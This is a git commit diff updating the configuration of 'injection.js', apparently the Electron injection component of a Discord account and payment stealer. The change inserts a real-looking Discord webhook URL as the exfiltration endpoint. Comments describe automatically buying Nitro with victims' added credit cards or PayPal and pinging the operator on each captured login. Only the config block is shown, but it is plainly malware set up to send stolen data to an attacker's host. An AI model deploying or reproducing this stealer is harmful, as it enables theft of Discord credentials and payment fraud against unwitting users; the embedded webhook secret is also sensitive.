4d2739dc86d0995e6f4de168365f4306f1086e3c
PK <106291038+PKDORX@users.noreply.github.com>
2022-12-11 20:01:18 -0300

    Update injection.js

--- injection.js
+++ injection.js
@@ -6,8 +6,8 @@ const querystring = require('querystring');
 const { BrowserWindow, session } = require('electron');
 
 const config = {
-  webhook: '%WEBHOOK%', //your discord webhook there obviously or use the api from https://github.com/Rdimo/Discord-Webhook-Protector | Recommend using https://github.com/Rdimo/Discord-Webhook-Protector so your webhook can't be spammed or deleted
-  webhook_protector_key: '%WEBHOOK_KEY%', //your base32 encoded key IF you're using https://github.com/Rdimo/Discord-Webhook-Protector
+  webhook: 'https://discord.com/api/webhooks/1050861047608782898/G6oYsD6dKFE_coVk9CdPR3EQXP7vdYuadMwv_HraR4Dy7BPukla9EQdm9ii2ecyuRhjh', //your discord webhook there obviously or use the api from https://github.com/Rdimo/Discord-Webhook-Protector | Recommend using https://github.com/Rdimo/Discord-Webhook-Protector so your webhook can't be spammed or deleted
+  webhook_protector_key: 'https://discord.com/api/webhooks/1050861047608782898/G6oYsD6dKFE_coVk9CdPR3EQXP7vdYuadMwv_HraR4Dy7BPukla9EQdm9ii2ecyuRhjh', //your base32 encoded key IF you're using https://github.com/Rdimo/Discord-Webhook-Protector
   auto_buy_nitro: false, //automatically buys nitro for you if they add credit card or paypal or tries to buy nitro themselves
   ping_on_run: true, //sends whatever value you have in ping_val when you get a run/login
   ping_val: '@everyone', //change to @here or <@ID> to ping specific user if you want, will only send if ping_on_run is true
